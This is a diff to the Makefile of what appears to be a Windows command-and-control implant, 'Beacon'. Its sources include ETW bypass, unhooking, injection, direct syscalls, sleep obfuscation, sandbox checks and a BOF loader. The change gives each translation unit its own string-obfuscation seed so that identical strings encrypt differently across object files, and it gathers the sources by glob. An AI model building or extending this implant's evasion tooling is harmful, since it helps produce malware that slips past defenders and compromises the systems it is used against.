@@ -20,20 +20,17 @@ else
     ECHO = @echo
 endif
 
-# BUILD_SEED is evaluated ONCE per `make` invocation and passed to every
-# translation unit as BUILD_TIME_RANDOM_SEED.  It MUST be a single per-build
-# value (not per-TU) because Bastia's string obfuscation derives its per-string
-# seed as BUILD_TIME_RANDOM_SEED ^ S.hash().  Per-TU seeds would cause strings
-# defined in one TU to decrypt to garbage when accessed from another TU.
-BUILD_SEED := $(shell $(PYTHON) -c "import random; print(hex(random.randrange(1<<64)))")
+# BUILD_TIME_RANDOM_SEED is now evaluated per translation unit (see pattern
+# rule below).  Each .cpp gets a unique seed, so strings compiled in different
+# TUs use different LCG streams even for identical literals.  The magic LCG
+# derivation constants stay compile-time only — never visible in the binary.
 
 CXXFLAGS = -target $(TARGET) -nostdlib -nostartfiles -Oz -std=c++20 \
            -maes -fno-builtin -fno-threadsafe-statics -fno-exceptions \
            -Wall -flto=full -MD -MP -ffunction-sections -fdata-sections \
            -fvisibility=hidden -Wl,--build-id=none \
            -fno-unwind-tables -fno-asynchronous-unwind-tables \
-           -I$(OUTPUT_DIR)/.. -I. -Iinclude -IBeacon/include \
-           -DBUILD_TIME_RANDOM_SEED=$(BUILD_SEED)
+           -I$(OUTPUT_DIR)/.. -I. -Iinclude -IBeacon/include
 
 _ALBEDO := $(or $(filter 1,$(ALBEDO)),$(filter 1,$(USE_ALBEDO)))
 ifneq ($(_ALBEDO),1)
@@ -53,40 +50,11 @@ LDFLAGS = -fuse-ld=lld \
           -Wl,--entry=__start -Wl,--gc-sections -Wl,-s \
           -Wl,--no-dynamicbase -Wl,--subsystem,console
 
-SOURCES = Beacon/core/main.cpp \
-          Beacon/core/handlers.cpp \
-          Beacon/core/pandragon_runtime.cpp \
-          Beacon/core/resolver.cpp \
-          Beacon/core/syscalls.cpp \
-          Beacon/core/utils.cpp \
-          Beacon/core/etw_bypass.cpp \
-          Beacon/core/config_parser.cpp \
-          Beacon/core/injection.cpp \
-          Beacon/core/unhook.cpp \
-           Beacon/core/sleep_obf.cpp \
-           Beacon/core/sleep_morpheus.cpp \
-           Beacon/core/sleep_utils.cpp \
-          Beacon/libs/managers.cpp \
-          Beacon/libs/network/winhttp.cpp \
-          Beacon/libs/network/tcp_socket.cpp \
-          Beacon/libs/network/pipe_transport.cpp \
-          Beacon/libs/network/transport.cpp \
-          Beacon/core/coff/beacon_compatibility.cpp \
-          Beacon/core/coff/coff_loader.cpp \
-          Beacon/core/coff/bof_runner.cpp \
-          Beacon/core/coff/async_bof_manager.cpp \
-          Beacon/core/coff/bof_cache.cpp \
-          Beacon/core/sandbox.cpp \
-          Beacon/core/coff/beacon_api_resolver.cpp \
-           Beacon/libs/bastia/bastia.cpp \
-           Beacon/libs/network/net_malleable.cpp \
-           Beacon/libs/network/net_crypto.cpp \
-           Beacon/libs/network/net_sysinfo.cpp \
-           Beacon/libs/network/net_abstract.cpp
+SOURCES = $(shell find Beacon -name '*.cpp' ! -path '*/test/*' \
+              ! -name 'config.cpp' ! -name 'doh.cpp' | sort)
 
 OBJECTS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.o)
 DEPS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.d)
--include $(DEPS)
 
 ifeq ($(DEBUG),1)
     CXXFLAGS += -DDEBUG
@@ -96,8 +64,16 @@ endif
 .PHONY: all clean setup keys test ssl-cert \
         server gui run-server run-server-args run-gui
 
-all: keys $(OUTPUT)
+all: check-debug-consistency keys $(OUTPUT)
 	$(ECHO) "[+] Beacon: $(OUTPUT)"
+
+-include $(DEPS)
+
+# ── Guard: config debug_mode must match compile-time DEBUG ──
+# If there's a mismatch (or the config is missing/invalid), refuse to build.
+.PHONY: check-debug-consistency
+check-debug-consistency:
+	@$(PYTHON) tools/check_debug_config.py $(CONFIG_FILE) $(DEBUG)
 
 keys: $(KEY_FILE)
 
@@ -122,7 +98,9 @@ $(OUTPUT): $(OBJECTS) | $(GENERATED_CONFIG)
 
 $(OUTPUT_DIR)/%.o: %.cpp
 	@mkdir -p $(dir $@)
-	$(CXX) $(CXXFLAGS) -c $< -o $@
+	$(CXX) $(CXXFLAGS) \
+	    -DBUILD_TIME_RANDOM_SEED=$$(python3 -c "import random; print(hex(random.randrange(1<<64)))") \
+	    -c $< -o $@
 
 $(OBJECTS): | $(GENERATED_CONFIG)
 
